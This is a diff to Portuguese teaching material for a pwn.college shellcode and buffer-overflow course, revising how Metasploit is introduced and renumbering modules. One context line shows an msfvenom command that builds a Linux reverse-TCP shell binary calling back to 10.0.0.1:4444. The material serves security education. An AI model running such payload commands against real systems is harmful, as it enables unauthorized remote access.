@@ -6,11 +6,12 @@ mostrar os comandos e introduzir o framework. Ele é independente da plataforma.
 > **Importante sobre o ambiente:** o container do pwn.college usado nos desafios é
 > **offline e não tem o `msfvenom` instalado** (`msfvenom: command not found`; o
 > instalador via `curl` falha com `Could not resolve host`; `sudo`/`apt` não funcionam).
-> Portanto, **o Metasploit não roda dentro dos desafios**. Nos módulos 8 e 9 a
-> pontuação sai pelo `pwntools`, que já está no container. O Metasploit é
-> **demonstrado fora** do pwn.college (máquina do professor, VM Kali ou Docker) usando
-> os comandos deste documento. A ideia pedagógica: mostrar a ferramenta aqui, e provar
-> o mesmo efeito com `pwntools` no desafio.
+> Portanto, **o Metasploit não roda dentro dos desafios** — e por isso ele **não tem
+> módulos de prática** neste dojo. Fica como este material conceitual. A prática da
+> ferramenta é feita **fora** do pwn.college (máquina do professor, VM Kali ou Docker),
+> usando os comandos deste documento, em outro momento. A prática pontuada do dojo é
+> toda em `pwntools`/C (shellcode nos módulos 1–7; corrupção e buffer overflow nos
+> módulos 8–14).
 
 ---
 
@@ -36,7 +37,7 @@ Ligação com o nosso dojo: nos módulos 1–7 você escreveu shellcode à mão 
 | **`msfvenom`** (gera payloads) | o seu `pwntools` |
 | **encoder** (transforma os bytes, evita bad chars) | o decoder XOR do módulo 5 (`encoded`) |
 | **stager / stage** (payload em etapas) | o payload staged do módulo 6 |
-| **exploit** (entrega o payload por uma vulnerabilidade) | o buffer overflow dos módulos 14–17 |
+| **exploit** (entrega o payload por uma vulnerabilidade) | o buffer overflow dos módulos 12–14 |
 | **`msfconsole`** | — (orquestrador; não tem equivalente manual) |
 
 ---
@@ -53,7 +54,7 @@ O framework organiza tudo em **tipos de módulo**:
   - *stages*: o restante entregue pelo stager.
 - **encoders** — reescrevem os bytes do payload para evitar bad chars (ex.: `0x00`) ou
   assinaturas simples. **Não** servem para "ficar indetectável".
-- **nops** — geram NOP sleds (o do módulo 13).
+- **nops** — geram NOP sleds (o do módulo 11).
 - **auxiliary** — scanners, fuzzers, módulos que não entregam shell.
 - **post** — ações após obter acesso (coleta, pivô) — fora do escopo desta aula.
 
@@ -193,10 +194,11 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o rev
    `od`. Esse é o elo com o shellcode dos módulos 1–7.
 4. Gerar a versão **sem `0x00`** com `-b`/`-e` e comparar com o módulo 3 (`null-free`) e
    o módulo 5 (`encoded`).
-5. Voltar ao pwn.college e **pontuar os módulos 8 e 9 com `pwntools`**, comparando os
-   bytes gerados: mesma ideia, ferramenta diferente.
-6. Seguir para os módulos 10–17 (corrupção de memória e buffer overflow) mostrando que
-   o buffer overflow é o **exploit** que entrega um payload como os do `msfvenom`.
+5. Comparar os bytes do `msfvenom` com os que você gerou à mão com `pwntools` nos
+   módulos 1–7 do dojo: mesma ideia, ferramenta diferente.
+6. Seguir para os módulos 8–14 do pwn.college (corrupção de memória e buffer overflow)
+   mostrando que o buffer overflow é o **exploit** que entrega um payload como os do
+   `msfvenom`. (A prática do Metasploit em si fica para outro momento, fora daqui.)
 
 ---
 
